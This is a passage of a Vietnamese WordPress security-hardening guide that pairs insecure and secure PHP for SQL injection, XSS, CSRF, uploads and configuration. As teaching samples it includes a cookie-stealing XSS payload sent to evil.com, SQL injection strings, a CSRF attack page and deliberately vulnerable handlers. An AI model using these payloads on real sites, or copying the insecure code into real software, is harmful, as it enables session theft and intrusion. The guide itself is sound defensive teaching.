    // Kiểm tra quyền - dùng cap theo post type
    $post_type = get_post_type( $post_id );
    if ( 'page' === $post_type ) {
        if ( ! current_user_can( 'edit_page', $post_id ) ) {
            return;
        }
    } else {
        if ( ! current_user_can( 'edit_post', $post_id ) ) {
            return;
        }
    }

    // An toàn để lưu dữ liệu
    if ( isset( $_POST['my_field'] ) ) {
        update_post_meta(
            $post_id,
            '_my_field',
            sanitize_text_field( wp_unslash( $_POST['my_field'] ) )
        );
    }
}
```

---

## 7. SQL Injection Prevention

### 7.1. Luôn sử dụng $wpdb->prepare()

```php
<?php
global $wpdb;

// SAI - NGUY HIỂM: SQL Injection
$id = $_GET['id'];
$result = $wpdb->get_row( "SELECT * FROM {$wpdb->posts} WHERE ID = {$id}" );
// Attacker có thể gửi: ?id=1 OR 1=1

// SAI - Vẫn bị injection dù có dùng ngoặc kép
$title = $_POST['title'];
$result = $wpdb->get_results(
    "SELECT * FROM {$wpdb->posts} WHERE post_title = '{$title}'"
);
// Attacker có thể gửi: title=' OR '1'='1

// ĐÚNG: Sử dụng $wpdb->prepare()
$id = absint( $_GET['id'] );
$result = $wpdb->get_row(
    $wpdb->prepare( "SELECT * FROM {$wpdb->posts} WHERE ID = %d", $id )
);

$title = sanitize_text_field( $_POST['title'] );
$result = $wpdb->get_results(
    $wpdb->prepare(
        "SELECT * FROM {$wpdb->posts} WHERE post_title = %s",
        $title
    )
);
```

### 7.2. Các trường hợp đặc biệt

```php
<?php
global $wpdb;

// LIKE query - Sử dụng $wpdb->esc_like()
$search = $_GET['s'];
$like = '%' . $wpdb->esc_like( $search ) . '%';
$results = $wpdb->get_results(
    $wpdb->prepare(
        "SELECT * FROM {$wpdb->posts} WHERE post_title LIKE %s",
        $like
    )
);

// IN clause - Không thể dùng 1 placeholder cho mảng
$ids = array_map( 'absint', $_GET['ids'] );  // Sanitize trước
$placeholders = implode( ', ', array_fill( 0, count( $ids ), '%d' ) );
$results = $wpdb->get_results(
    $wpdb->prepare(
        "SELECT * FROM {$wpdb->posts} WHERE ID IN ({$placeholders})",
        ...$ids
    )
);

// ORDER BY và tên bảng - KHÔNG thể dùng prepare cho tên bảng và ORDER BY
// Phải whitelist
$allowed_orderby = array( 'ID', 'post_title', 'post_date' );
$orderby = in_array( $_GET['orderby'], $allowed_orderby, true )
    ? $_GET['orderby']
    : 'ID';
$order = strtoupper( $_GET['order'] ) === 'DESC' ? 'DESC' : 'ASC';

$results = $wpdb->get_results(
    $wpdb->prepare(
        "SELECT * FROM {$wpdb->posts}
         WHERE post_type = %s
         ORDER BY {$orderby} {$order}",
        'post'
    )
);

// KHÔNG BAO GIỜ dùng $wpdb->prepare cho ORDER BY/table name
// SAI: $wpdb->prepare( "SELECT * FROM %s ORDER BY %s", $table, $col );
// prepare() sẽ thêm ngoặc kép quanh %s, làm hỏng query
```

### 7.3. Sử dụng WordPress API thay vì raw SQL

```php
<?php
// Thay vì raw SQL, ưu tiên dùng WordPress API:

// Thay vì: SELECT * FROM wp_posts WHERE ID = 42
$post = get_post( 42 );

// Thay vì: SELECT * FROM wp_postmeta WHERE post_id = 42 AND meta_key = '_price'
$price = get_post_meta( 42, '_price', true );

// Thay vì: INSERT INTO wp_postmeta ...
update_post_meta( 42, '_price', 500000 );

// Thay vì: SELECT * FROM wp_options WHERE option_name = 'my_option'
$value = get_option( 'my_option' );

// Thay vì raw SELECT với nhiều điều kiện
$query = new WP_Query( array(
    'post_type'  => 'product',
    'meta_query' => array(
        array(
            'key'     => '_price',
            'value'   => 500000,
            'compare' => '<=',
            'type'    => 'NUMERIC',
        ),
    ),
) );
// WP_Query tự động sử dụng prepare() bên trong
```

---

## 8. XSS Prevention

### 8.1. Reflected XSS

```php
<?php
// SAI: Reflected XSS - dữ liệu từ URL được in trực tiếp
echo '<p>Kết quả tìm kiếm: ' . $_GET['s'] . '</p>';
// Attacker: ?s=<script>document.location='http://evil.com/?c='+document.cookie</script>

// ĐÚNG:
echo '<p>Kết quả tìm kiếm: ' . esc_html( $_GET['s'] ) . '</p>';
```

### 8.2. Stored XSS

```php
<?php
// SAI: Lưu và hiển thị dữ liệu không escape
update_post_meta( $post_id, '_bio', $_POST['bio'] );
// Sau đó:
echo get_post_meta( $post_id, '_bio', true ); // XSS!

// ĐÚNG: Sanitize khi lưu, escape khi hiển thị
update_post_meta(
    $post_id,
    '_bio',
    sanitize_textarea_field( wp_unslash( $_POST['bio'] ) )
);
// Khi hiển thị:
echo esc_html( get_post_meta( $post_id, '_bio', true ) );
// Hoặc nếu cho phép HTML:
echo wp_kses_post( get_post_meta( $post_id, '_bio', true ) );
```

### 8.3. DOM-based XSS

```javascript
// SAI: innerHTML với dữ liệu người dùng
var search = new URLSearchParams(window.location.search).get('q');
document.getElementById('result').innerHTML = 'Tìm: ' + search;
// Attacker: ?q=<img src=x onerror=alert(document.cookie)>

// ĐÚNG: Sử dụng textContent
document.getElementById('result').textContent = 'Tìm: ' + search;

// ĐÚNG: Nếu cần HTML, sanitize trước
function escapeHtml(text) {
    var div = document.createElement('div');
    div.textContent = text;
    return div.innerHTML;
}
document.getElementById('result').innerHTML = 'Tìm: ' + escapeHtml(search);
```

### 8.4. Quy tắc escape theo ngữ cảnh

```php
<?php
// TRONG HTML BODY: dùng esc_html()
echo '<p>' . esc_html( $data ) . '</p>';

// TRONG HTML ATTRIBUTES: dùng esc_attr()
echo '<input value="' . esc_attr( $data ) . '">';

// TRONG URL (href, src, action): dùng esc_url()
echo '<a href="' . esc_url( $url ) . '">';

// TRONG INLINE JAVASCRIPT: dùng esc_js()
echo '<button onclick="alert(\'' . esc_js( $data ) . '\')">';

// TRONG TEXTAREA: dùng esc_textarea()
echo '<textarea>' . esc_textarea( $data ) . '</textarea>';

// CHO HTML CONTENT: dùng wp_kses_post()
echo '<div class="content">' . wp_kses_post( $content ) . '</div>';
```

---

## 9. CSRF Prevention

### 9.1. CSRF là gì?

CSRF (Cross-Site Request Forgery) xảy ra khi attacker lừa người dùng thực hiện hành động không mong muốn trên website mà người dùng đã đăng nhập.

```html
<!-- Trang web độc hại của attacker -->
<!-- Người dùng đã đăng nhập WordPress sẽ tự động gửi request này -->
<img src="https://yoursite.com/wp-admin/admin-post.php?action=delete_all_posts"
     style="display:none">

<!-- Hoặc form tự động submit -->
<form action="https://yoursite.com/wp-admin/admin-post.php" method="post" id="csrf-form">
    <input type="hidden" name="action" value="update_settings">
    <input type="hidden" name="admin_email" value="attacker@evil.com">
</form>
<script>document.getElementById('csrf-form').submit();</script>
```

### 9.2. Phòng chống CSRF với Nonces

```php
<?php
// PATTERN CHUẨN: Form + Nonce + Verify + Capability Check

// Bước 1: Tạo form với nonce
function my_admin_form() {
    ?>
    <form method="post" action="<?php echo esc_url( admin_url( 'admin-post.php' ) ); ?>">
        <?php wp_nonce_field( 'my_update_settings', '_my_nonce' ); ?>
        <input type="hidden" name="action" value="my_update_settings">

        <input type="text" name="site_title"
               value="<?php echo esc_attr( get_option( 'my_site_title', '' ) ); ?>">

        <?php submit_button(); ?>
    </form>
    <?php
}

// Bước 2: Xử lý form - Verify nonce + Check capability
add_action( 'admin_post_my_update_settings', 'my_handle_update_settings' );

function my_handle_update_settings() {
    // Kiểm tra nonce (chống CSRF)
    if ( ! isset( $_POST['_my_nonce'] )
         || ! wp_verify_nonce( $_POST['_my_nonce'], 'my_update_settings' ) ) {
        wp_die(
            'Yêu cầu không hợp lệ. Nonce verification thất bại.',
            'Lỗi bảo mật',
            array( 'response' => 403 )
        );
    }

    // Kiểm tra quyền (chống privilege escalation)
    if ( ! current_user_can( 'manage_options' ) ) {
        wp_die(
            'Bạn không có quyền thực hiện thao tác này.',
            'Không có quyền',
            array( 'response' => 403 )
        );
    }

    // An toàn để xử lý dữ liệu
    $title = isset( $_POST['site_title'] )
        ? sanitize_text_field( wp_unslash( $_POST['site_title'] ) )
        : '';
    update_option( 'my_site_title', $title );

    wp_safe_redirect( add_query_arg( 'updated', '1', wp_get_referer() ) );
    exit;
}
```

### 9.3. Nonce cho URL actions

```php
<?php
// Tạo URL với nonce
$delete_url = wp_nonce_url(
    admin_url( 'admin.php?page=my-plugin&action=delete&id=' . $item_id ),
    'delete_item_' . $item_id,
    '_wpnonce'
);

echo '<a href="' . esc_url( $delete_url ) . '"'
    . ' onclick="return confirm(\'Bạn có chắc muốn xóa?\');">'
    . 'Xóa</a>';

// Xử lý action
function my_handle_delete() {
    if ( ! isset( $_GET['action'] ) || 'delete' !== $_GET['action'] ) {
        return;
    }

    $item_id = absint( $_GET['id'] );

    // Kiểm tra nonce
    check_admin_referer( 'delete_item_' . $item_id );

    // Kiểm tra quyền
    if ( ! current_user_can( 'delete_posts' ) ) {
        wp_die( 'Không có quyền.' );
    }

    // Thực hiện xóa...
    my_delete_item( $item_id );

    wp_safe_redirect( admin_url( 'admin.php?page=my-plugin&deleted=1' ) );
    exit;
}
```

---

## 10. File Upload Security

### 10.1. Kiểm tra file upload an toàn

```php
<?php
function my_handle_file_upload() {
    // Kiểm tra nonce
    if ( ! wp_verify_nonce( $_POST['upload_nonce'], 'my_file_upload' ) ) {
        wp_die( 'Nonce verification thất bại.' );
    }

    // Kiểm tra quyền
    if ( ! current_user_can( 'upload_files' ) ) {
        wp_die( 'Bạn không có quyền upload file.' );
    }

    // Kiểm tra file có được gửi không
    if ( empty( $_FILES['my_file'] ) || $_FILES['my_file']['error'] !== UPLOAD_ERR_OK ) {
        wp_die( 'Không có file nào được gửi hoặc có lỗi khi upload.' );
    }

    $file = $_FILES['my_file'];

    // Kiểm tra kích thước file (5MB)
    $max_size = 5 * 1024 * 1024;
    if ( $file['size'] > $max_size ) {
        wp_die( 'File quá lớn. Tối đa 5MB.' );
    }

    // Kiểm tra MIME type thực sự (không tin Content-Type từ client)
    $file_type = wp_check_filetype_and_ext(
        $file['tmp_name'],
        $file['name']
    );

    if ( ! $file_type['type'] ) {
        wp_die( 'Loại file không được phép.' );
    }

    // Whitelist MIME types
    $allowed_types = array(
        'image/jpeg',
        'image/png',
        'image/gif',
        'image/webp',
        'application/pdf',
    );

    if ( ! in_array( $file_type['type'], $allowed_types, true ) ) {
        wp_die( 'Chỉ chấp nhận file ảnh (JPEG, PNG, GIF, WebP) và PDF.' );
    }

    // Sử dụng WordPress upload handler
    require_once ABSPATH . 'wp-admin/includes/file.php';
    require_once ABSPATH . 'wp-admin/includes/media.php';
    require_once ABSPATH . 'wp-admin/includes/image.php';

    // Cách 1: Upload như media attachment
    $attachment_id = media_handle_upload( 'my_file', 0 );

    if ( is_wp_error( $attachment_id ) ) {
        wp_die( 'Lỗi upload: ' . $attachment_id->get_error_message() );
    }

    return $attachment_id;
}
```

### 10.2. Giới hạn file types

```php
<?php
// Giới hạn MIME types được phép upload
add_filter( 'upload_mimes', 'my_custom_mime_types' );
function my_custom_mime_types( $mimes ) {
    // Thêm loại file
    $mimes['svg'] = 'image/svg+xml';  // CẨN THẬN với SVG - có thể chứa XSS

    // Xóa loại file
    unset( $mimes['exe'] );
    unset( $mimes['php'] );

    return $mimes;
}

// Kiểm tra nội dung file (không chỉ dựa vào extension)
add_filter( 'wp_check_filetype_and_ext', 'my_verify_file_content', 10, 5 );
function my_verify_file_content( $data, $file, $filename, $mimes, $real_mime ) {
    if ( 'image/svg+xml' === $data['type'] ) {
        $content = file_get_contents( $file );
        if ( preg_match( '/<script|onclick|onerror|onload/i', $content ) ) {
            $data['type'] = false;
            $data['ext']  = false;
        }
    }

    return $data;
}
```

### 10.3. Bảo vệ thư mục upload

```apache
# Thêm vào .htaccess trong wp-content/uploads/

# Block tất cả PHP execution
<Files *.php>
    deny from all
</Files>
```

```php
<?php
// Tạo .htaccess tự động khi activate plugin
register_activation_hook( __FILE__, function() {
    $upload_dir = wp_upload_dir();
    $htaccess = $upload_dir['basedir'] . '/.htaccess';

    if ( ! file_exists( $htaccess ) ) {
        $content = "# Disable PHP execution\n";
        $content .= "<Files *.php>\n";
        $content .= "deny from all\n";
        $content .= "</Files>\n";

        file_put_contents( $htaccess, $content );
    }
} );
```

### 10.4. Form upload an toàn

```php
<?php
function my_upload_form() {
    ?>
    <form method="post" enctype="multipart/form-data">
        <?php wp_nonce_field( 'my_file_upload', 'upload_nonce' ); ?>

        <label for="my_file">Chọn file (JPEG, PNG, PDF - Tối đa 5MB):</label>
        <input type="file" name="my_file" id="my_file"
               accept=".jpg,.jpeg,.png,.pdf">

        <?php submit_button( 'Upload' ); ?>
    </form>
    <?php
}
```

---

## 11. WordPress Security Constants

Định nghĩa trong `wp-config.php` để tăng cường bảo mật.

### 11.1. Các constants bảo mật chính

```php
<?php
// === FILE SYSTEM SECURITY ===

// Tắt chỉnh sửa file trong admin (Plugin/Theme Editor)
define( 'DISALLOW_FILE_EDIT', true );

// Tắt cài đặt/cập nhật plugin/theme từ admin
define( 'DISALLOW_FILE_MODS', true );

// === SSL/HTTPS ===

// Bắt buộc HTTPS cho trang admin
define( 'FORCE_SSL_ADMIN', true );

// === PERFORMANCE VÀ STORAGE ===

// Giới hạn revisions (giảm kích thước database)
define( 'WP_POST_REVISIONS', 5 );     // Tối đa 5 revisions
// define( 'WP_POST_REVISIONS', false ); // Tắt revisions

// Thời gian autosave (giây)
define( 'AUTOSAVE_INTERVAL', 120 );    // 2 phút (mặc định 60)

// Trash - số ngày trước khi xóa vĩnh viễn
define( 'EMPTY_TRASH_DAYS', 7 );       // 7 ngày (mặc định 30)

// === NETWORK ===

// Block external HTTP requests (bảo vệ khỏi SSRF)
define( 'WP_HTTP_BLOCK_EXTERNAL', true );
// Cho phép chỉ các hosts cụ thể
define( 'WP_ACCESSIBLE_HOSTS', 'api.wordpress.org,downloads.wordpress.org' );

// === DEBUG (TẮT TRÊN PRODUCTION!) ===

define( 'WP_DEBUG', false );
define( 'WP_DEBUG_LOG', false );
define( 'WP_DEBUG_DISPLAY', false );
define( 'SCRIPT_DEBUG', false );

// === CRON ===

// Tắt WordPress Cron (sử dụng system cron thay thế)
define( 'DISABLE_WP_CRON', true );
// Crontab: */5 * * * * wget -q -O - https://example.com/wp-cron.php > /dev/null 2>&1

// === UPDATES ===

// Tắt tự động update
define( 'AUTOMATIC_UPDATER_DISABLED', true );

// Hoặc chỉ cho phép minor/security updates
define( 'WP_AUTO_UPDATE_CORE', 'minor' );
// 'minor' : Chỉ minor updates (5.9.1 -> 5.9.2)
// true    : Tất cả updates
// false   : Tắt tất cả auto updates

// === MEMORY ===

define( 'WP_MEMORY_LIMIT', '256M' );
define( 'WP_MAX_MEMORY_LIMIT', '512M' );  // Cho admin
```

### 11.2. Authentication Keys và Salts

```php
<?php
// Lấy từ: https://api.wordpress.org/secret-key/1.1/salt/
// Đổi các key này sẽ làm vô hiệu tất cả session hiện tại (logout tất cả users)

define( 'AUTH_KEY',         'put your unique phrase here' );
define( 'SECURE_AUTH_KEY',  'put your unique phrase here' );
define( 'LOGGED_IN_KEY',    'put your unique phrase here' );
define( 'NONCE_KEY',        'put your unique phrase here' );
define( 'AUTH_SALT',        'put your unique phrase here' );
define( 'SECURE_AUTH_SALT', 'put your unique phrase here' );
define( 'LOGGED_IN_SALT',   'put your unique phrase here' );
define( 'NONCE_SALT',       'put your unique phrase here' );
```

---

## 12. .htaccess Security Rules

### 12.1. Bảo vệ wp-config.php và .htaccess

```apache
# Bảo vệ wp-config.php
<Files wp-config.php>
    Order Allow,Deny
    Deny from all
</Files>

# Bảo vệ chính file .htaccess
<Files .htaccess>
    Order Allow,Deny
    Deny from all
</Files>
```

### 12.2. Tắt directory listing

```apache
Options -Indexes
```

### 12.3. Block truy cập các file nhạy cảm

```apache
# Block truy cập các file nhạy cảm
<FilesMatch "^(wp-config\.php|readme\.html|license\.txt|xmlrpc\.php)$">
    Order Allow,Deny
    Deny from all
</FilesMatch>

# Block truy cập các file ẩn (bắt đầu bằng dấu chấm)
<FilesMatch "^\.">
    Order Allow,Deny
    Deny from all
</FilesMatch>

# Block truy cập file log
<FilesMatch "\.log$">
    Order Allow,Deny
    Deny from all
</FilesMatch>
```

### 12.4. Bảo vệ wp-includes

```apache
<IfModule mod_rewrite.c>
    RewriteEngine On
    RewriteBase /
    RewriteRule ^wp-admin/includes/ - [F,L]
    RewriteRule !^wp-includes/ - [S=3]
    RewriteRule ^wp-includes/[^/]+\.php$ - [F,L]
    RewriteRule ^wp-includes/js/tinymce/langs/.+\.php - [F,L]
    RewriteRule ^wp-includes/theme-compat/ - [F,L]
</IfModule>
```

### 12.5. Bảo vệ thư mục uploads

```apache
# Trong wp-content/uploads/.htaccess
<Files *.php>
    deny from all
</Files>
```

### 12.6. Chặn XML-RPC

```apache
<Files xmlrpc.php>
    Order Allow,Deny
    Deny from all
</Files>
```

```php
<?php
// Hoặc tắt qua PHP
add_filter( 'xmlrpc_enabled', '__return_false' );

// Xóa header link
remove_action( 'wp_head', 'rsd_link' );
remove_action( 'wp_head', 'wlwmanifest_link' );
```

### 12.7. Security headers

```apache
<IfModule mod_headers.c>
    # Chống clickjacking
    Header set X-Frame-Options "SAMEORIGIN"

    # Chống MIME-type sniffing
    Header set X-Content-Type-Options "nosniff"

    # XSS Protection
    Header set X-XSS-Protection "1; mode=block"

    # Referrer Policy
    Header set Referrer-Policy "strict-origin-when-cross-origin"

    # Strict Transport Security (chỉ khi đã có SSL)
    Header set Strict-Transport-Security "max-age=31536000; includeSubDomains; preload"

    # Permissions Policy
    Header set Permissions-Policy "camera=(), microphone=(), geolocation=()"

    # Content Security Policy (tùy chỉnh theo site)
    # Header set Content-Security-Policy "default-src 'self'; script-src 'self' 'unsafe-inline';"
</IfModule>
```

### 12.8. Giới hạn truy cập wp-login.php

```apache
# Chỉ cho phép đăng nhập từ IP cụ thể
<Files wp-login.php>
    Order Deny,Allow
    Deny from all
    Allow from 192.168.1.0/24
    Allow from your.office.ip.address
</Files>
```

---

## 13. Hardening wp-config.php

### 13.1. Vị trí wp-config.php

WordPress tự động tìm wp-config.php ở thư mục cha. Di chuyển nó lên 1 cấp để bảo mật hơn.

```
/home/user/wp-config.php          <-- Ở đây (không truy cập được từ web)
/home/user/public_html/            <-- Document root
/home/user/public_html/wp-admin/
/home/user/public_html/wp-content/
/home/user/public_html/wp-includes/
/home/user/public_html/index.php
```

### 13.2. wp-config.php mẫu an toàn cho production

```php
<?php
/**
 * WordPress Configuration File - Production
 * KHÔNG commit file này vào git!
 */

// === DATABASE ===
define( 'DB_NAME',     'my_wp_database' );
define( 'DB_USER',     'my_wp_user' );          // KHÔNG dùng root
define( 'DB_PASSWORD', 'strong_random_password' ); // Mật khẩu mạnh
define( 'DB_HOST',     'localhost' );
define( 'DB_CHARSET',  'utf8mb4' );
define( 'DB_COLLATE',  '' );

// Table prefix - KHÔNG dùng mặc định 'wp_'
$table_prefix = 'a1b2c3_';

// === AUTHENTICATION KEYS AND SALTS ===
// Lấy từ: https://api.wordpress.org/secret-key/1.1/salt/
define( 'AUTH_KEY',         'gia-tri-ngau-nhien-1' );
define( 'SECURE_AUTH_KEY',  'gia-tri-ngau-nhien-2' );
define( 'LOGGED_IN_KEY',    'gia-tri-ngau-nhien-3' );
define( 'NONCE_KEY',        'gia-tri-ngau-nhien-4' );
define( 'AUTH_SALT',        'gia-tri-ngau-nhien-5' );
define( 'SECURE_AUTH_SALT', 'gia-tri-ngau-nhien-6' );
define( 'LOGGED_IN_SALT',   'gia-tri-ngau-nhien-7' );
define( 'NONCE_SALT',       'gia-tri-ngau-nhien-8' );

// === SECURITY ===
define( 'DISALLOW_FILE_EDIT', true );
define( 'DISALLOW_FILE_MODS', true );
define( 'FORCE_SSL_ADMIN', true );
define( 'WP_AUTO_UPDATE_CORE', 'minor' );

// === PERFORMANCE ===
define( 'WP_POST_REVISIONS', 5 );
define( 'AUTOSAVE_INTERVAL', 120 );
define( 'EMPTY_TRASH_DAYS', 7 );
define( 'WP_MEMORY_LIMIT', '256M' );
define( 'WP_MAX_MEMORY_LIMIT', '512M' );

// === CRON ===
define( 'DISABLE_WP_CRON', true );

// === DEBUG (TẮT TRÊN PRODUCTION) ===
define( 'WP_DEBUG', false );
define( 'WP_DEBUG_LOG', false );
define( 'WP_DEBUG_DISPLAY', false );
define( 'SCRIPT_DEBUG', false );
ini_set( 'display_errors', 0 );

// === LOAD WORDPRESS ===
if ( ! defined( 'ABSPATH' ) ) {
    define( 'ABSPATH', dirname( __FILE__ ) . '/' );
}
require_once ABSPATH . 'wp-settings.php';
```

### 13.3. Sử dụng environment variables

```php
<?php
// Lấy từ biến môi trường (không hardcode trong file)
define( 'DB_NAME',     getenv( 'WP_DB_NAME' ) );
define( 'DB_USER',     getenv( 'WP_DB_USER' ) );
define( 'DB_PASSWORD', getenv( 'WP_DB_PASSWORD' ) );
define( 'DB_HOST',     getenv( 'WP_DB_HOST' ) ?: 'localhost' );

// Thêm .env vào .gitignore!
```

---

## 14. Plugin/Theme Security Checklist

### 14.1. Input Processing

```
[ ] Tất cả $_GET, $_POST, $_REQUEST đã được sanitize
[ ] Tất cả $_COOKIE đã được sanitize
[ ] Tất cả HTTP headers đã được sanitize
[ ] Sử dụng wp_unslash() trước khi sanitize $_POST/$_GET
[ ] Dữ liệu từ database được escape trước khi hiển thị
[ ] Không sử dụng extract() trên dữ liệu người dùng
[ ] Không sử dụng eval(), assert() với dữ liệu người dùng
[ ] Không sử dụng unserialize() với dữ liệu không tin cậy
```

### 14.2. Database Security

```
[ ] Tất cả SQL queries sử dụng $wpdb->prepare()
[ ] LIKE queries sử dụng $wpdb->esc_like()
[ ] ORDER BY, table names được whitelist
[ ] Ưu tiên sử dụng WordPress API (get_post, get_option, WP_Query)
[ ] IN clauses sử dụng nhiều placeholders
[ ] Không sử dụng $wpdb->query() với dữ liệu chưa sanitize
```

### 14.3. Output Security

```
[ ] HTML body: esc_html()
[ ] HTML attributes: esc_attr()
[ ] URLs: esc_url()
[ ] JavaScript inline: esc_js()
[ ] Textarea: esc_textarea()
[ ] HTML content: wp_kses_post() hoặc wp_kses()
[ ] JSON output: wp_json_encode()
[ ] Redirect URLs: wp_safe_redirect() + esc_url_raw()
```

### 14.4. Authentication và Authorization

```
[ ] Form có nonce field (wp_nonce_field)
[ ] Form handler kiểm tra nonce (wp_verify_nonce / check_admin_referer)
[ ] AJAX handler kiểm tra nonce (check_ajax_referer)
[ ] URL actions có nonce (wp_nonce_url)
[ ] Kiểm tra current_user_can() trước mọi thao tác
[ ] REST API endpoints có permission_callback
[ ] Admin pages có capability requirement trong add_menu_page()
[ ] Meta box save handler kiểm tra nonce + capability + autosave
```

### 14.5. File Security

```
[ ] File upload kiểm tra MIME type thực sự (wp_check_filetype_and_ext)
[ ] File upload giới hạn kích thước
[ ] File upload chỉ chấp nhận whitelist extensions
[ ] Thư mục upload có .htaccess chặn PHP execution
[ ] Không sử dụng include/require với đường dẫn từ người dùng
[ ] Sử dụng sanitize_file_name() cho tên file
```

### 14.6. Server Configuration

```
[ ] HTTPS được bật
[ ] DISALLOW_FILE_EDIT = true
[ ] WP_DEBUG = false trên production
[ ] Table prefix không phải 'wp_'
[ ] Authentication keys/salts là giá trị random duy nhất
[ ] Database user không phải root và chỉ có quyền cần thiết
[ ] wp-config.php không commit vào git
[ ] .htaccess bảo vệ các file nhạy cảm
[ ] XML-RPC tắt nếu không sử dụng
[ ] Security headers được cấu hình
[ ] PHP errors không hiển thị trên production
[ ] Backup định kỳ
```

---

## 15. Ví dụ code bảo mật đúng cách vs sai cách

### 15.1. Form xử lý

```php
<?php
// ==========================================
// SAI - KHÔNG AN TOÀN
// ==========================================
function bad_save_settings() {
    // Không kiểm tra nonce -> CSRF
    // Không kiểm tra quyền -> Privilege escalation

    $title = $_POST['title'];  // Không sanitize -> Stored XSS
    update_option( 'my_title', $title );

    echo 'Đã lưu: ' . $title;  // Không escape -> Reflected XSS

    header( 'Location: ' . $_POST['redirect'] );  // Open redirect
}

// ==========================================
// ĐÚNG - AN TOÀN
// ==========================================
function good_save_settings() {
    // 1. Kiểm tra nonce (chống CSRF)
    if ( ! isset( $_POST['_my_nonce'] )
         || ! wp_verify_nonce( $_POST['_my_nonce'], 'save_my_settings' ) ) {
        wp_die( 'Xác thực bảo mật thất bại.', 403 );
    }

    // 2. Kiểm tra quyền (chống privilege escalation)
    if ( ! current_user_can( 'manage_options' ) ) {
        wp_die( 'Không có quyền.', 403 );
    }

    // 3. Sanitize input
    $title = isset( $_POST['title'] )
        ? sanitize_text_field( wp_unslash( $_POST['title'] ) )
        : '';

    // 4. Validate
    if ( empty( $title ) || mb_strlen( $title ) > 200 ) {
        wp_die( 'Tiêu đề không hợp lệ (1-200 ký tự).' );
    }

    // 5. Lưu dữ liệu (đã sanitize)
    update_option( 'my_title', $title );

    // 6. Escape khi hiển thị
    echo 'Đã lưu: ' . esc_html( $title );

    // 7. Safe redirect (không dùng URL từ user input)
    wp_safe_redirect( admin_url( 'admin.php?page=my-settings&updated=1' ) );
    exit;
}
```

### 15.2. AJAX handler

```php
<?php
// ==========================================
// SAI - NHIỀU LỖ HỔNG
// ==========================================
add_action( 'wp_ajax_bad_delete', 'bad_ajax_delete' );
function bad_ajax_delete() {
    $id = $_POST['id'];  // Không sanitize

    global $wpdb;
    // SQL Injection!
    $wpdb->query( "DELETE FROM {$wpdb->prefix}items WHERE id = {$id}" );
    echo json_encode( array( 'success' => true ) );
    die();
}

// ==========================================
// ĐÚNG - AN TOÀN
// ==========================================
add_action( 'wp_ajax_good_delete', 'good_ajax_delete' );
function good_ajax_delete() {
    // 1. Kiểm tra nonce
    if ( ! check_ajax_referer( 'my_delete_nonce', 'nonce', false ) ) {
        wp_send_json_error( array( 'message' => 'Xác thực thất bại.' ), 403 );
    }

    // 2. Kiểm tra quyền
    if ( ! current_user_can( 'delete_posts' ) ) {
        wp_send_json_error( array( 'message' => 'Không có quyền.' ), 403 );
    }

    // 3. Sanitize và validate input
    $id = isset( $_POST['id'] ) ? absint( $_POST['id'] ) : 0;
    if ( ! $id ) {
        wp_send_json_error( array( 'message' => 'ID không hợp lệ.' ) );
    }

    // 4. Kiểm tra item tồn tại và thuộc quyền user
    global $wpdb;
    $item = $wpdb->get_row(
        $wpdb->prepare(
            "SELECT * FROM {$wpdb->prefix}items WHERE id = %d",
            $id
        )
    );

    if ( ! $item ) {
        wp_send_json_error( array( 'message' => 'Item không tồn tại.' ) );
    }

    if ( (int) $item->user_id !== get_current_user_id()
         && ! current_user_can( 'manage_options' ) ) {
        wp_send_json_error( array( 'message' => 'Không có quyền xóa item này.' ) );
    }

    // 5. Thực hiện xóa (an toàn)
    $deleted = $wpdb->delete(
        $wpdb->prefix . 'items',
        array( 'id' => $id ),
        array( '%d' )
    );

    if ( false === $deleted ) {
        wp_send_json_error( array( 'message' => 'Lỗi khi xóa.' ) );
    }

    // 6. Trả về kết quả
    wp_send_json_success( array(
        'message' => 'Đã xóa thành công.',
        'id'      => $id,
    ) );
}
```

### 15.3. Custom query với search

```php
<?php
// ==========================================
// SAI - SQL INJECTION Ở MỌI CHỖ
// ==========================================
function bad_search() {
    global $wpdb;

    $keyword  = $_GET['keyword'];
    $category = $_GET['category'];
    $orderby  = $_GET['orderby'];
    $order    = $_GET['order'];

    $results = $wpdb->get_results(
        "SELECT * FROM {$wpdb->posts}
         WHERE post_title LIKE '%{$keyword}%'
         AND post_type = '{$category}'
         ORDER BY {$orderby} {$order}"
    );

    foreach ( $results as $row ) {
        echo '<h2>' . $row->post_title . '</h2>';      // XSS
        echo '<div>' . $row->post_content . '</div>';   // XSS
    }
}

// ==========================================
// ĐÚNG - AN TOÀN
// ==========================================
function good_search() {
    global $wpdb;

    // Sanitize tất cả input
    $keyword = isset( $_GET['keyword'] )
        ? sanitize_text_field( $_GET['keyword'] )
        : '';
    $category = isset( $_GET['category'] )
        ? sanitize_key( $_GET['category'] )
        : 'post';

    // Whitelist cho orderby và order
    $allowed_orderby = array( 'post_title', 'post_date', 'ID' );
    $orderby = isset( $_GET['orderby'] ) && in_array( $_GET['orderby'], $allowed_orderby, true )
        ? $_GET['orderby']
        : 'post_date';

    $order = isset( $_GET['order'] ) && strtoupper( $_GET['order'] ) === 'ASC'
        ? 'ASC'
        : 'DESC';

    // Validate post_type tồn tại
    $post_type_object = get_post_type_object( $category );
    if ( ! $post_type_object ) {
        $category = 'post';
    }

    // Sử dụng $wpdb->prepare với $wpdb->esc_like cho LIKE
    $like = '%' . $wpdb->esc_like( $keyword ) . '%';

    $results = $wpdb->get_results(
        $wpdb->prepare(
            "SELECT ID, post_title, post_content, post_date
             FROM {$wpdb->posts}
             WHERE post_title LIKE %s
             AND post_type = %s
             AND post_status = 'publish'
             ORDER BY {$orderby} {$order}
             LIMIT 20",
            $like,
            $category
        )
    );

    // Escape output
    foreach ( $results as $row ) {
        echo '<h2>' . esc_html( $row->post_title ) . '</h2>';
        echo '<div>' . wp_kses_post( $row->post_content ) . '</div>';
        echo '<time>' . esc_html( $row->post_date ) . '</time>';
    }
}
```

### 15.4. Shortcode

```php
<?php
// ==========================================
// SAI - XSS VÀ SQL INJECTION
// ==========================================
add_shortcode( 'bad_user_list', function( $atts ) {
    global $wpdb;

    $role = $atts['role'];  // Không sanitize
    $users = $wpdb->get_results(
        "SELECT * FROM {$wpdb->users}
         JOIN {$wpdb->usermeta} ON {$wpdb->users}.ID = {$wpdb->usermeta}.user_id
         WHERE meta_key = 'wp_capabilities' AND meta_value LIKE '%{$role}%'"
    );

    $output = '';
    foreach ( $users as $user ) {
        $output .= '<div>' . $user->display_name . '</div>';  // XSS
        $output .= '<div>' . $user->user_email . '</div>';    // XSS + lộ email
    }
    return $output;
} );

// ==========================================
// ĐÚNG - AN TOÀN
// ==========================================
add_shortcode( 'good_user_list', function( $atts ) {
    // Parse với giá trị mặc định
